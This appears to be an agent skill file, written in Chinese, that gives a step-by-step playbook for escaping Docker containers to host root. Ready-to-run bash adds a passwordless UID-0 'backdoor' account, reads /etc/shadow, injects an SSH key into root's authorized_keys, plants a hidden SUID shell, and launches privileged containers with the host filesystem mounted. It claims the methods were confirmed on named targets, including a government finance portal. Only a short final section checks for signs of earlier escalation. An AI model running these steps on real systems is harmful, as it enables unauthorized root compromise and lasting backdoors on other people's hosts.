---
name: docker-privesc
description: 通过 5 种技术从 Docker 容器逃逸至宿主机 root。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl
metadata:
  tags: [infra, docker, privilege-escalation, container-escape]
  category: infra
  related_skills:
    - port-service-discovery
    - api-noauth-hunt
---

# Docker 权限提升技能

Docker 容器逃逸与权限提升——Docker socket 滥用、卷挂载接管宿主机、docker 组
等同 root，以及既有提权痕迹检测。docker 组成员身份 = 通过 5 种不同技术瞬间获得
宿主机 root。已在 fitness-chain（提取出 Docker 容器、12 个镜像层、特权模式）与
gov-finance-portal（Dockerfile 与 docker-compose.prod.yml 暴露在 GitLab 中）上
得到确认。

## When to Use

- 你已获得某个 Docker 容器的 shell 访问权限（通过 webshell、SSH 或 API 利用）。
- `id` 显示你属于 `docker` 组，或你可以访问 `/var/run/docker.sock`。
- `docker ps` 或 `docker info` 可在容器内正常工作。
- 在 `api-noauth-hunt` 或 `wordpress-full-compromise` 于容器中实现 RCE 之后。
- Docker socket 挂载在 `/var/run/docker.sock`（检查：`ls -la /var/run/docker.sock`）。

## Prerequisites

- Docker 容器内部的 shell 访问权限（任意用户）。
- 已挂载 Docker socket，或属于 docker 组，或具有 `--privileged` 标志。
- 目标：提升至宿主机 root。

## How to Run

```bash
# Check docker group membership
id | grep docker && echo "[+] Docker group — instant root possible"

# Check docker socket
ls -la /var/run/docker.sock 2>/dev/null && echo "[+] Docker socket mounted — host escape"

# Check privileged mode
cat /proc/self/status | grep -i "seccomp\|cap" && echo "[*] Check capabilities"
```

## 快速参考

| 条件 | 逃逸方法 | 命令 |
|-----------|--------------|---------|
| Docker 组 | 卷挂载宿主机 `/` | `docker run --rm -v /:/host -it alpine chroot /host` |
| Docker socket | 创建特权容器 | `docker run --rm --privileged -v /:/host -it alpine` |
| `--privileged` | 直接访问宿主机文件系统 | `mount /dev/sda1 /mnt && chroot /mnt` |
| `SYS_ADMIN` 能力 | cgroup release_agent | 写入 cgroup 的 notify_on_release |
| 无 docker、无能力 | 查找已挂载的 socket/管道 | `find / -type s 2>/dev/null` |

## Procedure

### 阶段 1 —— 评估容器逃逸面

```bash
echo "[*] Container escape surface assessment"

# 1. Docker group
echo -n "  Docker group: "
if id | grep -q docker; then
  echo "YES — instant root via volume mount"
else
  echo "no"
fi

# 2. Docker socket
echo -n "  Docker socket: "
if ls -la /var/run/docker.sock 2>/dev/null; then
  echo "YES — host escape via docker command"
  SOCKET_PERMS=$(stat -c "%a %U:%G" /var/run/docker.sock 2>/dev/null)
  echo "  Permissions: $SOCKET_PERMS"
else
  echo "no"
fi

# 3. Privileged mode
echo -n "  Privileged: "
if ip link add dummy0 type dummy 2>/dev/null; then
  echo "YES — privileged container"
  ip link delete dummy0 2>/dev/null
else
  echo "no"
fi

# 4. Capabilities
echo "  Capabilities:"
grep CapEff /proc/self/status 2>/dev/null

# 5. Mounted volumes (potential host paths)
echo "  Mounted volumes:"
mount | grep -vE "^(overlay|tmpfs|proc|sys|devpts|cgroup)" | head -10

# 6. Host processes visible?
echo -n "  Host processes: "
PROC_COUNT=$(ls /proc | grep -c '^[0-9]' 2>/dev/null)
echo "$PROC_COUNT visible"
```

### 阶段 2 —— Docker 组 → 宿主机 root（5 种技术）

```bash
echo "[*] Docker group privesc"

# Technique 1: Volume mount + add user with UID 0
echo "[1] Adding user with UID 0 to /etc/passwd"
docker run --rm -v /etc:/host_etc alpine sh -c \
  'echo "backdoor::0:0::/root:/bin/bash" >> /host_etc/passwd'
su backdoor 2>/dev/null

# Technique 2: Volume mount + read shadow
echo "[2] Reading /etc/shadow"
docker run --rm -v /etc:/host_etc alpine cat /host_etc/shadow 2>/dev/null | head -5

# Technique 3: chroot to host root
echo "[3] Chroot to host root"
docker run --rm -v /:/host -it alpine chroot /host bash -c "id && hostname"

# Technique 4: Inject SSH key
echo "[4] Injecting SSH key to host root"
docker run --rm -v /root:/host_root alpine sh -c \
  'mkdir -p /host_root/.ssh && echo "YOUR_SSH_PUB_KEY" >> /host_root/.ssh/authorized_keys'

# Technique 5: Create SUID bash on host
echo "[5] Creating SUID bash on host"
docker run --rm -v /usr/local/bin:/host_bin alpine sh -c \
  'cp /bin/sh /host_bin/.backdoor && chmod u+s /host_bin/.backdoor'
/usr/local/bin/.backdoor -p 2>/dev/null
```

### 阶段 3 —— Docker socket → 宿主机 root

```bash
echo "[*] Docker socket exploitation"

# If docker client is available in the container
if command -v docker &>/dev/null; then
  echo "[+] Docker client available"

  # Create privileged container with host root mounted
  docker run --rm --privileged --pid=host -v /:/host alpine sh -c \
    "chroot /host bash -c 'id && hostname'"

  # Alternative: just exec into an existing host container
  docker ps  # List running containers
  docker exec -it <container_id> /bin/bash
fi

# If docker client is NOT available, install it or use the socket directly
if [[ ! -f /usr/bin/docker ]] && [[ -S /var/run/docker.sock ]]; then
  echo "[*] No docker client — using REST API via socket"
  curl --max-time 30 --connect-timeout 10 -sk --unix-socket /var/run/docker.sock http://localhost/containers/json | head -20
fi
```

### 阶段 4 —— 检测既有提权痕迹（取证）

```bash
echo "[*] Checking for prior privilege escalation on host"

# Check sudoers for NOPASSWD entries (docker privesc technique)
echo "  NOPASSWD sudoers:"
grep -r "NOPASSWD" /etc/sudoers /etc/sudoers.d/ 2>/dev/null | head -5

# Check for users with UID 0 (injected via /etc/passwd technique)
echo "  UID 0 users:"
awk -F: '$3 == 0 {print $1}' /etc/passwd 2>/dev/null

# Check for newly created authorized_keys files
echo "  Root SSH keys:"
ls -la ~/.ssh/authorized_keys 2>/dev/null
stat ~/.ssh/authorized_keys 2>/dev/null | grep Modify

# Check for SUID binaries
echo "  New SUID binaries:"
find / -perm -4000 -type f 2>/dev/null | while read f; do
  if stat "$f" 2>/dev/null | grep -q "Change:.*2026"; then
    echo "    $f (recently modified)"
  fi
done
```

## Pitfalls

- **并非所有容器都有 docker socket。** 它是由运维团队刻意挂载的。大多数容器并没有。
- **容器可能没有 docker 二进制文件。** 安装它：`apt-get update && apt-get install -y docker.io`（若有互联网访问）。
- **能力受限。** `--privileged` 很少见。检查 `CapEff` 掩码以了解有哪些能力可用。
- **AppArmor/SELinux 可能阻止相关操作。** 即使拥有 docker socket，SELinux 也可能阻止逃逸。
- **安全选项 no-new-privileges。** 它会阻止 SUID 二进制与 setuid() 系统调用。

## Verification

- Docker 组提权：必须能够通过卷挂载读取宿主机的 `/etc/shadow`。
- Docker socket：必须能够创建新的特权容器并在宿主机上执行命令。
- 特权模式：必须能够挂载宿主机文件系统并 chroot。
- 既有提权：必须识别出至少一项指标（NOPASSWD sudo、UID 0 异常、新增 SSH 密钥、SUID 二进制）。
- 记录：容器权限、所用逃逸方法以及所获得的宿主机 root 访问权限。
